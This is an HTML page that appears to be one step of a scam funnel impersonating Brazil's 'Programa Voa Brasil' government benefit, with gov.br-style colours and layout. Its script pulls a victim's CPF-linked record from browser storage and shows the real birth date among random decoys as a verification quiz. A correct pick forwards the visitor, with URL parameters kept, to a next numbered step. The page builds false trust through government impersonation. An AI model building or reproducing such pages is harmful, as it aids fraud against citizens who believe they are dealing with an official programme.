<!DOCTYPE html>
<html lang="pt-BR">
  <head>
    <meta charset="UTF-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
    />
    <title>Voa Brasil - Confirmação</title>
    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        font-family: "Rawline", -apple-system, BlinkMacSystemFont, "Segoe UI",
          sans-serif;
      }

      body {
        background-color: #f8f9fa;
        min-height: 100vh;
        max-width: 100%;
        overflow-x: hidden;
        position: relative;
      }

      .header-image {
        width: 100%;
        background: white;
      }

      .header-image img {
        width: 100%;
        height: auto;
        display: block;
      }

      .container {
        width: 100%;
        max-width: 460px;
        margin: 16px auto;
        background: white;
        padding: 16px;
      }

      .top-bar {
        background: white;
        padding: 8px 12px;
        display: flex;
        justify-content: space-between;
        align-items: center;
        border-bottom: 1px solid #ddd;
        width: 100%;
      }

      .logo {
        height: 24px;
      }

      .top-icons {
        display: flex;
        align-items: center;
        gap: 12px;
      }

      .top-icons img {
        height: 20px;
      }

      .user-button {
        background: #1351b4;
        color: white;
        padding: 4px 12px;
        border-radius: 20px;
        text-decoration: none;
        font-size: 12px;
      }

      .sub-header {
        background: white;
        padding: 8px 12px;
        display: flex;
        align-items: center;
        gap: 12px;
        border-bottom: 1px solid #ddd;
        width: 100%;
      }

      .menu-icon {
        font-size: 20px;
      }

      .sub-header h1 {
        font-size: 14px;
        font-weight: 500;
      }

      .title {
        font-size: 18px;
        color: #1b1b1b;
        text-align: center;
        margin-bottom: 24px;
      }

      .question {
        margin-bottom: 16px;
      }

      .question-number {
        display: inline-flex;
        align-items: center;
        justify-content: center;
        width: 20px;
        height: 20px;
        background: #1351b4;
        color: white;
        border-radius: 50%;
        margin-right: 8px;
        font-size: 12px;
      }

      .question-text {
        font-size: 14px;
        color: #1b1b1b;
      }

      .options {
        display: flex;
        flex-direction: column;
        gap: 8px;
      }

      .option {
        padding: 16px;
        background: #f8f9fa;
        border-radius: 4px;
        cursor: pointer;
        font-size: 14px;
        border: 2px solid transparent;
        transition: all 0.2s ease;
      }

      .option:hover {
        background: #e9ecef;
      }

      .option.selected {
        background: #e5f0ff;
        border-color: #1351b4;
        color: #1351b4;
      }

      .confirm-button {
        width: 100%;
        padding: 12px;
        background: #1351b4;
        color: white;
        border: none;
        border-radius: 20px;
        font-size: 14px;
        cursor: pointer;
        margin-top: 24px;
      }

      .confirm-button:hover {
        background: #0d47a1;
      }

      .confirm-button:disabled {
        background-color: #cccccc;
        cursor: not-allowed;
      }

      .social-links {
        display: flex;
        justify-content: center;
        gap: 20px;
        margin: 30px 0;
      }

      .social-links a {
        color: #1351b4;
        text-decoration: none;
      }

      .footer-image {
        width: 100%;
        margin-top: 40px;
      }

      .footer-image img {
        width: 100%;
        height: auto;
        display: block;
      }

      .header-content {
        position: absolute;
        top: 8px;
        right: 16px;
        display: flex;
        align-items: center;
        gap: 12px;
        z-index: 10;
      }

      .header-button {
        background: transparent;
        color: white;
        padding: 6px 16px 6px 36px;
        border-radius: 20px;
        text-decoration: none;
        font-size: 14px;
        font-weight: 500;
        position: relative;
      }

      .header-button::before {
        content: "";
        position: absolute;
        left: 12px;
        top: 50%;
        transform: translateY(-50%);
        width: 16px;
        height: 16px;
        background-image: url("imagens/user-icon.png");
        background-size: contain;
        background-repeat: no-repeat;
      }

      .header-button:hover {
        background: transparent;
        opacity: 0.9;
      }

      /* Estilo para a mensagem de erro */
      .error-message {
        background-color: #ffebee;
        color: #c62828;
        padding: 12px;
        border-radius: 4px;
        margin-top: 16px;
        font-size: 14px;
        display: flex;
        align-items: center;
        border-left: 4px solid #c62828;
        display: none;
      }

      .error-message::before {
        content: "⚠️";
        margin-right: 8px;
        font-size: 16px;
      }

      /* Animação para a mensagem de erro */
      @keyframes fadeIn {
        from {
          opacity: 0;
          transform: translateY(-10px);
        }
        to {
          opacity: 1;
          transform: translateY(0);
        }
      }

      .error-message.show {
        display: flex;
        animation: fadeIn 0.3s ease-out forwards;
      }

      @media (max-width: 480px) {
        .container {
          margin: 12px auto;
          padding: 12px;
        }

        .title {
          font-size: 16px;
          margin-bottom: 20px;
        }

        .option {
          padding: 10px;
        }
      }
    </style>
  </head>

  <body>
    <div class="header-image">
      <img src="images/head-pag3-2.0.jpg" alt="Header" />
      <div class="header-content">
        <a href="#" class="header-button">CLIENTE</a>
      </div>
    </div>

    <div class="container">
      <h2 class="title">
        Confirme seus dados para o cadastro<br />no Programa Voa Brasil
      </h2>

      <div class="question">
        <span class="question-number">1</span>
        <span class="question-text">Qual é sua data de nascimento?</span>
      </div>

      <div class="options" id="options-div">
        <!-- As opções serão preenchidas via JavaScript -->
      </div>

      <div id="error-message" class="error-message">
        Por favor, selecione a data de nascimento correta para continuar.
      </div>

      <button class="confirm-button" id="confirm-button">Confirmar</button>
    </div>

    <div class="footer-image">
      <img src="images/rodape3.jpg" alt="Rodapé" />
    </div>

    <script>
      function log(message, data = null) {
        if (data) {
          console.log(`[VOA BRASIL] ${message}:`, data);
        } else {
          console.log(`[VOA BRASIL] ${message}`);
        }
      }

      function formatarData(data) {
        const dia = String(data.getDate()).padStart(2, "0");
        const mes = String(data.getMonth() + 1).padStart(2, "0");
        const ano = data.getFullYear();
        return `${dia}/${mes}/${ano}`;
      }

      function gerarDatasAleatorias(dataCorreta, quantidade) {
        const partesData = dataCorreta.split("/");
        const dataCorretaObj = new Date(
          parseInt(partesData[2]),
          parseInt(partesData[1]) - 1,
          parseInt(partesData[0])
        );

        const datasGeradas = [];

        const hoje = new Date();
        const idadeMinima = 18;
        const idadeMaxima = 70;

        const dataMinima = new Date(hoje);
        dataMinima.setFullYear(hoje.getFullYear() - idadeMaxima);

        const dataMaxima = new Date(hoje);
        dataMaxima.setFullYear(hoje.getFullYear() - idadeMinima);

        while (datasGeradas.length < quantidade) {
          const timestamp =
            dataMinima.getTime() +
            Math.random() * (dataMaxima.getTime() - dataMinima.getTime());
          const dataAleatoria = new Date(timestamp);

          const dataFormatada = formatarData(dataAleatoria);

          if (
            dataFormatada !== dataCorreta &&
            !datasGeradas.includes(dataFormatada)
          ) {
            datasGeradas.push(dataFormatada);
          }
        }

        return datasGeradas;
      }

      function embaralharArray(array) {
        log("Embaralhando array de datas");
        for (let i = array.length - 1; i > 0; i--) {
          const j = Math.floor(Math.random() * (i + 1));
          [array[i], array[j]] = [array[j], array[i]];
        }
        return array;
      }

      document.addEventListener("DOMContentLoaded", function () {
        try {
          const userData = JSON.parse(localStorage.getItem("dadosCPF"));

          if (!userData || !userData.NASC) {
            throw new Error("Dados do usuário não encontrados");
          }

          const dataCorreta = userData.NASC;

          const datasAleatorias = gerarDatasAleatorias(dataCorreta, 3);

          const todasOpcoes = [...datasAleatorias, dataCorreta];
          const opcoesEmbaralhadas = embaralharArray(todasOpcoes);

          const optionsDiv = document.getElementById("options-div");
          optionsDiv.innerHTML = "";

          opcoesEmbaralhadas.forEach((data) => {
            const optionDiv = document.createElement("div");
            optionDiv.className = "option";
            optionDiv.textContent = data;
            optionsDiv.appendChild(optionDiv);
          });

          const options = document.querySelectorAll(".option");
          const confirmButton = document.getElementById("confirm-button");
          const errorMessage = document.getElementById("error-message");

          let selectedText = "";

          options.forEach((option) => {
            option.addEventListener("click", () => {
              options.forEach((opt) => opt.classList.remove("selected"));
              option.classList.add("selected");
              selectedText = option.textContent.trim();

              errorMessage.classList.remove("show");
            });
          });

          confirmButton.addEventListener("click", () => {
            if (!selectedText) {
              errorMessage.textContent =
                "Por favor, selecione uma data para continuar.";
              errorMessage.classList.add("show");
              return;
            }

            if (selectedText === dataCorreta) {
              var currentUrlParams = window.location.search;
              window.location.href = "../5/index.html" + currentUrlParams;
            } else {
              errorMessage.textContent =
                "Data incorreta. Por favor, selecione sua data de nascimento correta para continuar.";
              errorMessage.classList.add("show");
            }
          });
        } catch (error) {
          const optionsDiv = document.getElementById("options-div");
          optionsDiv.innerHTML =
            '<div class="error-message show">Ocorreu um erro ao carregar seus dados. Por favor, volte à página anterior e tente novamente.</div>';

          document.getElementById("confirm-button").disabled = true;
        }
      });
    </script>
  </body>
</html>
